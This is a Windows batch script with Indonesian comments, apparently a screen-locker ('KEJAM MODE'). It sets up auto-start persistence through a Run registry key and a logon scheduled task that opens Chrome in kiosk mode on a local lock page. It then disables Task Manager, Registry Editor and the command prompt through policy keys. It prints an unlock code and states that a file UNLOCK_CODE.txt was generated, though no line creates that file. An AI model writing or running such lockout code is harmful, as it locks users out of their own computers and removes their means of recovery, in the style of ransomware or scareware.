@echo off
title LOCK SYSTEM
color 0c

echo ========================================
echo     LOCK SYSTEM ACTIVATOR - KEJAM MODE
echo ========================================
echo.

:: Bikin registry supaya auto start
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemLock" /t REG_SZ /d "start chrome --kiosk http://localhost/lock_screen.php --new-window --start-fullscreen" /f

:: Bikin task scheduler buat jaga-jaga
schtasks /create /tn "SystemLock" /tr "start chrome --kiosk http://localhost/lock_screen.php" /sc onlogon /f

:: Disable task manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Disable registry editor
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

:: Disable CMD
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f

echo.
echo [✔] LOCK SYSTEM AKTIF!
echo [✔] AUTO START DI LOGIN!
echo [✔] TASK MANAGER DIBLOKIR!
echo [✔] REGEDIT DIBLOKIR!
echo [✔] CMD DIBLOKIR!
echo.
echo KODE UNLOCK: 123456  (GANTI SESUKA LU!)
echo.
echo File UNLOCK_CODE.txt udah digenerate.
echo JANGAN LUPA CATET KODENYA!
echo.
pause